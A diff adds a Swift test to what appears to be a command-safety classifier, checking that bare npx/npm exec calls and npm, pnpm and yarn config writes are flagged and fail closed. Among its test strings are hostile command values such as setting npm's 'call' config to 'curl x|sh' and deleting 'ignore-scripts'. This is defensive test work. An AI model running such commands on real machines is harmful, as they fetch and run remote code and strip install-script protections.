@@ -88,4 +88,34 @@ final class P2ClassifierCarryoverTests: HermeticTestCase {
             ("guard npm install init", "npm install init", [], true),
         ])
     }
+
+    /// X5–X7: a bare `npx` or `npm exec` runs the `call` config from `.npmrc` or the environment,
+    /// which the command text does not show, and an update command never needs to change
+    /// package-manager config. Both fail closed.
+    func testBareRunnersAndConfigWritesFailClosed() {
+        assertRows([
+            ("X5 bare npx", "npx", [.unparseable], true),
+            ("X5 bare npm exec", "npm exec", [.unparseable], true),
+            ("X5 npx options only", "npx -y", [.unparseable], true),
+            ("X5 npm x options only", "npm x --yes", [.unparseable], true),
+            ("X5 npm exec after a valued option", "npm --prefix /tmp/p exec", [.unparseable], true),
+            ("X5 env npx", "env npx", [.unparseable], true),
+            ("X6 config set then bare npx", "npm config set call 'curl x|sh'; npx", [.chained, .unparseable], true),
+            ("X6 npm set", "npm set script-shell /tmp/x", [.unparseable], true),
+            ("X6 npm c set", "npm c set call x", [.unparseable], true),
+            ("X6 npm config edit", "npm config edit", [.unparseable], true),
+            ("X6 npm config delete", "npm config delete ignore-scripts", [.unparseable], true),
+            ("X6 npm option before config", "npm --global config set call x", [.unparseable], true),
+            ("X6 pnpm config set", "pnpm config set x y", [.unparseable], true),
+            ("X6 yarn config set", "yarn config set x y", [.unparseable], true),
+            ("X6 yarn config unset", "yarn config unset x", [.unparseable], true),
+            ("X7 npm config get", "npm config get registry", [], false),
+            ("X7 npm config list", "npm config list", [], false),
+            ("X7 npm view", "npm view pkg version", [], false),
+            ("X7 npm install -g pinned", "npm install -g pkg@1.2.3", [], true),
+            ("X7 npm outdated", "npm outdated -g --json", [], false),
+            ("guard npm install set", "npm install -g set", [], true),
+            ("guard command -v npx", "command -v npx", [], false),
+        ])
+    }
 }
